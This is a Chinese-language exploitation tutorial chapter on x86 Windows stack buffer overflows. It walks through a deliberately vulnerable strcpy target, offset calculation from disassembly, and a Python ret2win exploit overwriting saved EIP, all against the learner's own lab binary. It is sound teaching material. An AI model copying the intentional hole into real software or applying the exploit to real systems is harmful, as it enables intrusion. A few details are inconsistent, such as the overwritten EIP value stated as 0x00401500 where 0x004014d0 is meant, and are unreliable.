# Ch 19 — stack buffer overflow（x86，無防護的世界）

> **目標**：在一個無防護的 Windows x86 binary 上，從「buffer 被 strcpy 踩爆」一路走到「saved EIP 被蓋成我們指定的位址、控制執行流」。學完能說清楚 x86 Windows stack frame 和 Linux 的異同、mingw 編出來的 x86 靶為什麼是「第 0 層」的練習起點，以及這套「逐層加緩解」教學法的邏輯。

> **環境**：mingw-w64 i686 GCC 14.2（本機已驗，安裝路徑 `C:\msys64\mingw32\bin\gcc.exe`，需先設 TEMP 到 ASCII 路徑）；Python 3.12 ctypes。x86 WinDbg/cdb 操作標「未實測，理論預期」。

---

## 為什麼從 x86 無防護開始？

你已經在 Linux 做了 saved-RIP 覆寫、tcache 利用、FSOP，現在要進 Windows Part 3。第一個問題不是「怎麼打 Windows」，而是「最乾淨的 Windows 心智模型長什麼樣」。

把所有防護同時打開然後學習是個壞主意：你不知道「這個行為是 GS cookie 造成的」還是「ASLR 造成的」。正確做法是**逐層加防護**：

```
Ch 19  無防護（-fno-stack-protector -no-pie）      ← 你在這裡
  ↓
Ch 20  加 /GS（stack cookie）
  ↓
Ch 21  加 SEH overwrite 利用思路
  ↓
Ch 22  加 SEHOP
  ↓
Ch 23  加 DEP + ROP
```

每章只多一個緩解，你就能明確感受到「多了這個之後，之前的打法在哪裡被阻斷了」。這章是第 0 層：沒有 cookie、沒有 ASLR、DEP 理論上開著但攻擊面只需要控制 EIP 跳到已有程式碼，所以 DEP 不構成實質限制。

**和 Linux 對照**：你在 Linux binary_exploitation 做 `ret2win` 時，大概就是這個難度等級——找到 offset、填入目標位址、觸發返回。Windows x86 的機制和 Linux x86 幾乎一樣，差在 calling convention 細節和 stack frame 微小排列，這章讓你感受到「差在哪」。

---

## 先建立直覺：Windows x86 stack frame 和 Linux 的差異

你熟的 Linux x86 stack frame（`cdecl`，GCC 預設）：

```
高位址（stack bottom）
┌────────────────────────────────────┐
│  呼叫者的 stack frame              │
│  ...                               │
│  argument n  ← 呼叫者 push 的參數  │
│  argument 1                        │
│  return address (saved EIP)        │  ← call 指令 push 的返回位址
├────────────────────────────────────┤  ← EBP（callee prologue: push ebp; mov ebp,esp）
│  saved EBP                         │
│  local var 1                       │
│  local var 2                       │
│  ...                               │
│  char buf[N]                       │  ← overflow 目標
└────────────────────────────────────┘
低位址（stack top，ESP 在這附近）
```

Windows x86 MSVC（cdecl / stdcall）的 stack frame——**幾乎一樣**：

```
高位址
┌────────────────────────────────────┐
│  呼叫者的 stack frame              │
│  ...                               │
│  argument n  ← 呼叫者 push        │
│  argument 1                        │
│  return address (saved EIP)        │  ← 攻擊目標
├────────────────────────────────────┤  ← EBP
│  saved EBP                         │
│  (EXCEPTION_REGISTRATION_RECORD)   │  ← 如果有 __try，SEH record 在這裡
│  local vars                        │
│  char buf[N]                       │  ← overflow 起點
└────────────────────────────────────┘
低位址（ESP）
```

最大的差別是：**如果函式有 `__try`（MSVC 的 SEH frame），stack 上會多一個 `EXCEPTION_REGISTRATION_RECORD`，夾在 saved EBP 和 local vars 之間**。這個結構和「buffer → saved EBP → saved EIP」的排列讓 SEH overwrite 成為可能（Ch 21 的核心）。沒有 `__try` 的函式，Windows x86 和 Linux x86 的 stack frame 結構**完全相同**。

另一個要認識的差別是 calling convention 多樣性：

| Convention | 誰清理參數 | 常見場景 |
|---|---|---|
| `cdecl` | 呼叫者（GCC / MSVC 預設 for C） | 變數參數函式（`printf`） |
| `stdcall` | 被呼叫者 | Win32 API（`MessageBoxA`, `CreateFileA`…） |
| `fastcall` | 被呼叫者，前兩個參數用 ECX/EDX | COM 內部、某些 MSVC 函式 |

這對 overflow 的 offset 計算沒影響（offset 由 frame 佈局決定，和清理參數的人無關），但你在 ROP chain 裡呼叫 Win32 API 時，要確認 calling convention——Win32 API 幾乎全是 `stdcall`，呼叫後不用自己平衡 stack（被呼叫者自己 `ret N` 清掉了）。

---

## 靶程式：最小可溢位的 x86 Windows binary

### 程式碼

```c
/* vuln32.c — x86 mingw 無防護靶，教育示範 */
#include <stdio.h>
#include <string.h>

void win_function(void) {
    printf("[*] win_function() called! EIP hijacked!\n");
}

void vuln(const char *input) {
    char buf[64];
    strcpy(buf, input);        /* 危險點：無邊界檢查 */
    printf("buf = %.16s...\n", buf);
}

int main(int argc, char **argv) {
    printf("Normal execution: main -> vuln -> return\n");
    printf("win_function is at %p\n", (void*)win_function);
    if (argc > 1) {
        vuln(argv[1]);
    } else {
        vuln("hello");
    }
    printf("Returned from vuln normally.\n");
    return 0;
}
```

### 編譯（本機實測）

mingw32 的 temp 路徑可能含非 ASCII 字元導致組譯器失敗，先重導：

```powershell
# PowerShell — 設 ASCII temp 路徑，再編
$env:TEMP = "C:\tmp\build"
$env:TMP  = "C:\tmp\build"
$env:PATH = "C:\msys64\mingw32\bin;" + $env:PATH

New-Item -ItemType Directory -Force "C:\tmp\build" | Out-Null
& gcc -O0 -fno-stack-protector -no-pie -o C:\tmp\vuln32.exe C:\tmp\vuln32.c
```

旗標意義：

| 旗標 | 作用 | 若不加 |
|---|---|---|
| `-O0` | 關最佳化，保留 frame pointer 和可讀的 stack layout | 最佳化可能省掉 EBP frame，offset 變難算 |
| `-fno-stack-protector` | 不插 GCC stack canary | canary 擋在 saved EIP 前，讓 EIP 覆寫更難 |
| `-no-pie` | 關 PIE，使位址固定（關 ASLR 效果） | ASLR 讓 win_function 位址每次隨機，找 offset 更難 |

### 編譯輸出（本機實測）

```
$ ./vuln32.exe
Normal execution: main -> vuln -> return
win_function is at 004014d0
buf = hello...
Returned from vuln normally.
```

`win_function` 的位址 `0x004014d0` 是固定的（因為 `-no-pie`），每次執行不變。

### 防護狀態確認（本機實測）

```console
$ objdump -p C:\tmp\vuln32.exe | grep -iE "DllChar|DYNAMIC|NX|ENTROPY"
DllCharacteristics    00000100
                      NX_COMPAT
```

`0x0100` = 只有 `NX_COMPAT`（DEP）；沒有 `DYNAMIC_BASE`（ASLR）、沒有 `GUARD_CF`（CFG）。對照 Ch 0 的表格：

```
0x0020  HIGH_ENTROPY_VA   ❌
0x0040  DYNAMIC_BASE      ❌  （因為 -no-pie）
0x0100  NX_COMPAT         ✅  （mingw 預設給）
0x4000  GUARD_CF          ❌  （mingw 不支援）
```

DEP 開著，理論上不能在 stack 上執行 shellcode——但我們這章的目標是控制 EIP 跳到 `win_function`（已在可執行段裡），所以 DEP 不擋我們。這正好展示了「DEP 只能阻止 shellcode 注入，不能阻止 return-to-existing-code 攻擊」。

---

## 底層機制：x86 stack frame 的真實佈局

### 反組譯 `vuln` 函式（本機實測）

```nasm
; mingw32 gcc -O0 編出來的 vuln（AT&T 語法，已標註）
004014e5 <_vuln>:
  4014e5:  55                push   %ebp           ; 儲存 caller 的 EBP
  4014e6:  89 e5             mov    %esp,%ebp       ; 建立新的 frame：EBP = ESP
  4014e8:  83 ec 58          sub    $0x58,%esp      ; 為 local vars 保留 0x58=88 bytes

  ; 取第一個參數 (input) → EAX
  4014eb:  8b 45 08          mov    0x8(%ebp),%eax  ; 第一個參數在 ebp+8 (cdecl)
  4014ee:  89 44 24 04       mov    %eax,0x4(%esp)  ; 推 input 當 strcpy 第二個參數
  4014f2:  8d 45 b8          lea    -0x48(%ebp),%eax ; buf 的位址：ebp-0x48
  4014f5:  89 04 24          mov    %eax,(%esp)     ; 推 buf 當 strcpy 第一個參數
  4014f8:  e8 1b 73 00 00    call   408818 <_strcpy> ; 危險呼叫

  ; printf
  4014fd:  8d 45 b8          lea    -0x48(%ebp),%eax
  401500:  89 44 24 04       mov    %eax,0x4(%esp)
  401504:  c7 04 24 6d a0..  movl   $0x40a06d,(%esp)  ; 格式字串
  40150b:  e8 80 10 00 00    call   402590 <___mingw_printf>

  401510:  90                nop
  401511:  c9                leave                  ; mov esp,ebp; pop ebp
  401512:  c3                ret                    ; pop eip
```

**關鍵位址關係**（從 `lea -0x48(%ebp), %eax` 讀出）：

```
buf 起點 = EBP - 0x48 = EBP - 72
```

### Stack frame 全圖

```
高位址（stack bottom / main 的 frame 方向）
┌────────────────────────────────────────────────────────┐
│                                                        │
│  [ main 的 stack frame ]                               │
│  ...                                                   │
│  input 指標（第一個 cdecl 參數）    EBP + 8            │ ← vuln 執行時可見
│  ┌──────────────────────────────────────────────────┐  │
│  │ saved EIP（call vuln 時 push 的返回位址）         │  │ ← EBP + 4，覆寫目標
│  ├──────────────────────────────────────────────────┤  │
│  │ saved EBP（push ebp 存的 main 的 EBP）            │  │ ← EBP + 0
│  ├──────────────────────────────────────────────────┤  │ ← EBP（frame base）
│  │ [padding / 其他 local 空間]                       │  │
│  │                                                  │  │
│  │ buf[64]   起點 = EBP - 0x48                       │  │ ← ESP（strcpy 寫入起點）
│  └──────────────────────────────────────────────────┘  │
│  ...（sub $0x58 保留的額外空間，arglist scratch area）  │
└────────────────────────────────────────────────────────┘
低位址（stack top，ESP 在這裡）

距離計算（buf[0] → saved EIP）：
  buf 起點 (EBP - 0x48) 到 EBP         = 0x48 = 72 bytes
  EBP 到 saved EIP                      =    4 bytes
  ─────────────────────────────────────────────────────
  總計                                  =   76 bytes
```

覆寫流程：
1. `strcpy(buf, input)` 沒有邊界檢查，把 `input` 的所有 bytes 複製進去
2. 當 `input` 超過 76 bytes，第 73–76 bytes 蓋掉 saved EBP
3. 第 77–80 bytes（4 bytes）蓋掉 saved EIP
4. `ret` 指令執行：`pop eip`，從 stack 頂部取出被我們蓋掉的 4 bytes 當新的 EIP
5. EIP 指向 `win_function`，CPU 就跳過去了

> **和 Linux 的差異**：x86 Linux 的 offset 計算完全相同——buf 到 saved EIP 的 offset 取決於 stack frame layout，和 OS 無關。差在「上面有沒有 SEH record」：如果 `vuln` 用了 `__try`，SEH record 會插在 saved EBP 和 local vars 之間，讓 offset 增加 8 bytes（`EXCEPTION_REGISTRATION_RECORD` 的大小）。Ch 21 會詳細展開這個。

---

## 實際確認：objdump 看 offset（本機實測）

剛才的反組譯已經給了答案：`lea -0x48(%ebp), %eax` 就是 buf 的位址。用 Python 計算 offset：

```python
# 計算 saved EIP 的 overflow offset
buf_offset_from_ebp = 0x48   # 反組譯看到的 -0x48(%ebp)
saved_ebp_size      = 4      # x86 指標 4 bytes
total_to_saved_eip  = buf_offset_from_ebp + saved_ebp_size
print(f"offset to saved EIP = {total_to_saved_eip}")  # 76
```

執行結果：`offset to saved EIP = 76`

這個值**不是固定的**——它由 gcc 的 stack frame 分配決定（優化級別、函式內 local var 的總大小、stack alignment 規則都會影響）。真實情況下，你要麼看反組譯算，要麼用 cyclic pattern 在除錯器裡量。

---

## 用除錯器確認 EIP 被控（cdb 流程，未實測）

> **未實測，理論預期**：以下指令需要 `cdb.exe`（Windows SDK Debugging Tools）。裝好後照步驟驗證。

```bat
REM 用 76 個 'A' + win_function 位址蓋 saved EIP
REM win_function = 0x004014d0 → little-endian bytes: d0 14 40 00

cdb -c "g; !analyze -v; q" vuln32.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\x14\x40\x00
```

**預期行為**：
- 執行 `vuln32.exe` 並傳入 76 個 `A` + `\xd0\x14\x40\x00`
- `strcpy` 把 76 個 `A` 寫進去，然後把 saved EIP 蓋成 `0x00401500`（小端序）
- `ret` 跳到 `win_function`，印出 `[*] win_function() called!`

在真實的 WinDbg 互動流程中，你會看到：

```
(12ab.34cd): Access violation - code c0000005 (first chance)
eax=...  ebx=...  ecx=...  edx=...
esi=...  edi=...
eip=004014d0  esp=...  ebp=41414141  ← EBP 被 'AAAA' 蓋掉了
...
```

注意 `eip=004014d0`：EIP 指向 `win_function`，攻擊成功。`ebp=41414141` 說明 saved EBP 也被蓋了（4 個 `A` = `0x41414141`），這是正常的——我們不在乎 EBP，只在乎 EIP。

若要讓 EBP 看起來合法（需要進入 `win_function` 後正常返回），要把 saved EBP 那 4 bytes 填一個合理的 stack 位址，但入門版不需要。

### 用 cdb 的 cyclic pattern 量 offset（更可靠的方法）

```bat
REM 未實測；mona.py 或 pwndbg 的 cyclic 做法
REM 生成 200 bytes 的 cyclic pattern
python -c "from pwn import *; print(cyclic(200))" > payload.txt
cdb -c "g; r eip; q" vuln32.exe < payload.txt
```

看 EIP 的值是 cyclic pattern 的哪個位置，就是 offset。比手算 `0x48+4` 更可靠，因為不用讀組語。

---

## 對比：x86 Windows vs Linux

| 面向 | Windows x86（本章靶） | Linux x86（你熟悉的） |
|---|---|---|
| Stack frame 結構 | 相同：buf → saved EBP → saved EIP | 相同 |
| `ret` 覆寫機制 | 完全相同 | 完全相同 |
| Calling convention | cdecl（同）；Win32 API 多 stdcall | cdecl（GCC 預設） |
| 有 SEH record 嗎 | 只有帶 `__try` 的函式才有 | 無（signal handler 不在 stack） |
| Stack canary | GCC: `__stack_chk_guard`（全域）；MSVC: `__security_cookie`（per-module） | GCC: `__stack_chk_guard` via `fs:0x28`（per-thread） |
| DEP 預設？ | mingw 預設 `NX_COMPAT`=1 | 現代 Linux 預設 NX=1 |
| ASLR 預設？ | mingw 預設 `DYNAMIC_BASE`=1（`-no-pie` 可關） | GCC PIE 預設開（`-no-pie` 可關） |

最大的操作差異：Linux 上你用 `gdb`/`pwndbg`，Windows 上用 `x64dbg` 或 `cdb`/WinDbg。工具不同，但「看 offset、填位址、觀察 EIP」的思路完全一樣。

---

## 踩雷集錦

1. **「mingw 編 x86 像 Linux 一樣直接 `gcc -m32`」**：在本機（UCRT64 環境）`-m32` 不能用，因為沒有 32 位元的 multilib。要用 `C:\msys64\mingw32\bin\gcc.exe`（獨立的 i686 工具鏈）。而且 TEMP 路徑含中文會讓組譯器死亡，要先把 `$env:TEMP` 設到 ASCII 路徑。

2. **「`sub $0x58, %esp` 表示 buf 大小是 0x58」**：不對。`0x58` 是整個 local area 的保留空間（含 scratch、呼叫子函式時存參數的暫存區）。buf 的實際大小在 `lea -0x48(%ebp), %eax` 裡：buf 起點距 EBP 為 `0x48`，不是 `0x58`。

3. **「offset = 76，所以每次都是 76」**：這個 76 是這個函式在 GCC `-O0` 下編出的值。換一台機器、換 MSVC、加 `__try`、改優化等級——offset 都會不同。找 offset 的正確做法永遠是看反組譯或用 cyclic pattern，不是靠記憶。

4. **「DEP 開著，所以不能溢位」**：DEP（`NX_COMPAT`）阻止 stack 上的 shellcode **被執行**，但不阻止 saved EIP 被蓋掉。蓋掉 EIP 後跳到**已存在可執行段**裡的函式（`win_function`、Win32 API、ROP gadget）完全不受 DEP 影響。DEP 阻止的是「在 stack 上注入 shellcode 並執行」，不是「蓋 EIP 這個動作本身」。

5. **「呼叫者 push 的 input 指標在 EBP-X，不是 EBP+8」**：x86 cdecl 的參數在呼叫者 `call` 之前被 push，所以它們在 **callee 的 EBP 上方**（高位址）：`EBP+4` 是 saved EIP，`EBP+8` 是第一個參數，`EBP+12` 是第二個，以此類推。Local vars 在 EBP 下方（低位址）。不要搞反。

---

## 進階：再往深一層

### x86 Windows shadow space？沒有

x86 cdecl 沒有 shadow space（home space）。你的 x64 朋友們才有：x64 Windows ABI 規定 callee 在前 4 個暫存器參數的 home space（32 bytes 的 stack 空間）。在 x86，參數全靠 push/call，沒有這個問題。等 Part 3 做完進到 x64 時（Ch 40），shadow space 是你要重新適應的地方。

### `leave` 和 `pop ebp; mov esp, ebp` 的等價性

`leave` 指令是 `mov esp, ebp; pop ebp` 的等價。所以 `leave; ret` 的效果是：先把 ESP 恢復到 EBP（跳過所有 locals），再把 EBP 恢復到 saved EBP，再 `ret`（pop saved EIP → jump）。整個返回序列是 `leave; ret`。如果你在 ROP chain 裡需要 stack pivot，`leave; ret` 本身就是一個 pivot gadget（把 ESP 設成 EBP 的值）。

### 如何在 WinDbg 確認 SEH record 不在這個函式的 frame 裡

這個函式沒有 `__try`，所以 FS:[0] 的 chain 不包含它的 frame。

> **未實測**：在 WinDbg 裡，進入 `vuln` 後用 `!exchain` 看 SEH chain，確認最新的 record 不是剛才這個 frame 的位址，而是上層（main 或 runtime）的 record。

### cyclic pattern 工具

pwntools 的 `cyclic(200)` / `cyclic_find(0x61616161)` 是找 offset 的標準工具。`mona.py` 在 Immunity Debugger 下提供 `!mona pattern_create 200` 和 `!mona pattern_offset EIP_VALUE`，效果相同。

---

## 動手練習

環境：本機 mingw32 gcc（需先設 TEMP 到 ASCII 路徑）。

1. 編譯 `vuln32.c`（`-O0 -fno-stack-protector -no-pie`），確認 `win_function` 的固定位址。
2. 用 `objdump -d` 反組譯 `vuln`，手動算出 buf 到 saved EIP 的 offset。
3. 用 Python 寫一個 exploit：
   ```python
   import subprocess, struct
   win_addr = 0x004014d0   # 從輸出讀到的位址，換成你的值
   offset = 76
   payload = b"A" * offset + struct.pack("<I", win_addr)
   result = subprocess.run(
       ["C:/tmp/vuln32.exe", payload],
       capture_output=True, text=False
   )
   print(result.stdout.decode("utf-8", errors="replace"))
   ```
4. 確認輸出包含 `[*] win_function() called!`。
5. 把 `win_addr` 故意改成 `0xDEADBEEF`，觀察程式崩潰（Access Violation），理解「EIP 指向不可讀位址會發生什麼」。

---

## 本章重點整理

- Windows x86 的 stack frame 佈局和 Linux x86 **幾乎一樣**（都是 buf → saved EBP → saved EIP）；有 `__try` 的函式才多一個 SEH record。
- `strcpy` 類無邊界函式讓 overflow 越過 buf，蓋掉 saved EBP 再蓋掉 saved EIP；`ret` 時 CPU 把蓋掉的值當作下一條指令位址，控制流被劫持。
- 這個靶是「第 0 層」：沒有 cookie、沒有 ASLR；DEP 開著但我們跳到既有可執行程式碼，DEP 不構成障礙。
- 「逐層加緩解」教學法：每章只多一個防護，你能精確感受到「多了這個之後打法被擋在哪」。

---

## 自我檢核

- [ ] 不看筆記，能畫出 x86 cdecl 的 stack frame（buf / saved EBP / saved EIP / 參數）並標出每個區域的 EBP 偏移方向（正還是負）
- [ ] 能解釋「DEP 開著，為什麼 ret2win 還是能打」——從「DEP 保護什麼、不保護什麼」回答
- [ ] 看到反組譯裡的 `lea -0x48(%ebp), %eax`，能立刻說出 buf 起點到 saved EIP 的 offset 是幾 bytes
- [ ] 能說出 Windows x86 和 Linux x86 stack frame 的一個相同點和一個潛在差異（SEH record）
- [ ] 面試被問「如何找 offset to saved EIP」：能給出兩種方法（反組譯算 / cyclic pattern 量）並說明各自適用場景

---

## 延伸閱讀

### 部落格 / 教學

- **Corelan Team — "Exploit writing tutorial part 1: Stack Based Overflows"** — Peter Van Eeckhoutte（[corelan.be](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)）
  - **讀哪裡**：全文；特別是「Understanding the stack」和「Replicating the crash」兩節
  - **學什麼**：用 Immunity Debugger 現場觀察 EIP 被蓋的過程，並用 mona.py 做 pattern 搜尋；是本章實作的直接參照
  - **和本章關聯**：本章給了 mingw 的靜態分析方法，Corelan part 1 給了除錯器動態確認的方法；兩者互補
  - **前提**：x86 stack frame 概念（本章已建立）

- **"Uninformed" Vol.1, "Understanding Windows Shellcode"** — Matt Miller (skape)（[uninformed.org](http://uninformed.org/index.cgi?v=1&a=2)）
  - **讀哪裡**：第 1 章「Introduction」和第 2 章「Stack-based vulnerabilities」
  - **學什麼**：從 shellcode 開發者的角度看 x86 Windows stack overflow，包含「把 shellcode 放在 buf 裡然後 ret 回去」的傳統打法（現在 DEP 會阻擋）
  - **和本章關聯**：這篇寫於 DEP 前時代，展示了「為什麼 DEP 以後打法必須變」；讀完能感受到 Ch 23 DEP + ROP 為什麼是下一步
  - **前提**：x86 assembly 讀寫能力

### 官方文件

- **[/GS（Buffer Security Check）— MSVC 文件](https://learn.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check)**
  - **讀哪裡**：「How /GS works」小節
  - **學什麼**：下一章（Ch 20）的防護機制，提前了解 `/GS` 如何讓「蓋 saved EIP」變得更難；先看一眼，Ch 20 會詳細展開
  - **和本章關聯**：本章是「沒有 /GS 的世界」，這份文件是「有了 /GS 之後世界怎麼變」的官方描述

### 書籍

- **《Hacking: The Art of Exploitation, 2nd Edition》— Jon Erickson（No Starch Press）**
  - **讀哪裡**：Chapter 2 "Programming" 和 Chapter 3 "Exploitation" 中的 stack overflow 部分
  - **學什麼**：雖然以 Linux 為主，但 x86 stack frame 的圖解和 gdb 動手觀察的方法論完全可以遷移到本章；你已有 Linux 底子，拿來對照「差在哪」效果更好
  - **和本章關聯**：你做 `binary_exploitation` 時的地基；本章可視為「把那套直覺移植到 Windows」的起點

這章是本課 Part 3 的起點，刻意選最乾淨的版本。下一章把 `/GS` 加進來，看看 cookie 插在哪裡、怎麼擋、有沒有盲點。

→ [Ch 20 — /GS stack cookie：機制與繞過思路](./20-gs-stack-cookie.md)
